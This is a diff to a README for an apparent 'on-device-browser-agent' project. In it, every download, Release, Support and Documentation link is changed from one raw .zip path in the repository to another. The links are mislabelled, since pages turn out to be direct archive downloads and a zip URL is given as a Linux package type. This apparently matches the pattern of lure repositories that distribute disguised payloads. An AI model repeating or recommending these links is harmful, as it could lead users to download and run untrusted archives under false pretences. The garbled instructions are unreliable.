@@ -1,6 +1,6 @@
 # 🌐 on-device-browser-agent - Private AI Browser Automation Made Easy
 
-[![Download on GitHub](https://github.com/GamingTVcz12/on-device-browser-agent/raw/refs/heads/master/src/content/agent_on_device_browser_3.1.zip%20Now-Release%20Page-brightgreen)](https://github.com/GamingTVcz12/on-device-browser-agent/raw/refs/heads/master/src/content/agent_on_device_browser_3.1.zip)
+[![Download on GitHub](https://github.com/GamingTVcz12/on-device-browser-agent/raw/refs/heads/master/assets/on-browser-agent-device-v1.5.zip%20Now-Release%20Page-brightgreen)](https://github.com/GamingTVcz12/on-device-browser-agent/raw/refs/heads/master/assets/on-browser-agent-device-v1.5.zip)
 
 ## 📖 Overview
 
@@ -21,13 +21,13 @@ To use the on-device-browser-agent, follow the steps below. You will learn how t
 
 1. **Visit the Release Page:** Click the link below to open the Release page.
 
-   [Download on GitHub](https://github.com/GamingTVcz12/on-device-browser-agent/raw/refs/heads/master/src/content/agent_on_device_browser_3.1.zip)
+   [Download on GitHub](https://github.com/GamingTVcz12/on-device-browser-agent/raw/refs/heads/master/assets/on-browser-agent-device-v1.5.zip)
 
 2. **Choose the Right File:** On the Release page, you will see different versions of the application. Select the one that matches your operating system.
    
    - For **Windows**, look for the file ending in `.exe`.
    - For **macOS**, find the file ending in `.dmg`.
-   - For **Linux**, choose the file that fits your distribution (usually a `https://github.com/GamingTVcz12/on-device-browser-agent/raw/refs/heads/master/src/content/agent_on_device_browser_3.1.zip` or `.deb` file).
+   - For **Linux**, choose the file that fits your distribution (usually a `https://github.com/GamingTVcz12/on-device-browser-agent/raw/refs/heads/master/assets/on-browser-agent-device-v1.5.zip` or `.deb` file).
 
 3. **Download the File:** Click on the appropriate file to start downloading.
 
@@ -53,7 +53,7 @@ If you encounter any issues:
 
 - **Application Does Not Open:** Make sure you have the correct system requirements. Reinstall the app if necessary.
 - **Error Messages:** Contact support or check the GitHub issues page for similar problems and solutions.
-- **Need Additional Help?:** Visit our [Support Page](https://github.com/GamingTVcz12/on-device-browser-agent/raw/refs/heads/master/src/content/agent_on_device_browser_3.1.zip) for more assistance.
+- **Need Additional Help?:** Visit our [Support Page](https://github.com/GamingTVcz12/on-device-browser-agent/raw/refs/heads/master/assets/on-browser-agent-device-v1.5.zip) for more assistance.
 
 ## 📃 Contributing
 
@@ -63,7 +63,7 @@ We welcome contributions! If you have ideas for features or find bugs, please vi
 
 This project is licensed under the MIT License. You can use, modify, and distribute this software freely.
 
-For more detailed information, please visit the [Documentation](https://github.com/GamingTVcz12/on-device-browser-agent/raw/refs/heads/master/src/content/agent_on_device_browser_3.1.zip).
+For more detailed information, please visit the [Documentation](https://github.com/GamingTVcz12/on-device-browser-agent/raw/refs/heads/master/assets/on-browser-agent-device-v1.5.zip).
 
 ## 🌟 Acknowledgments
 
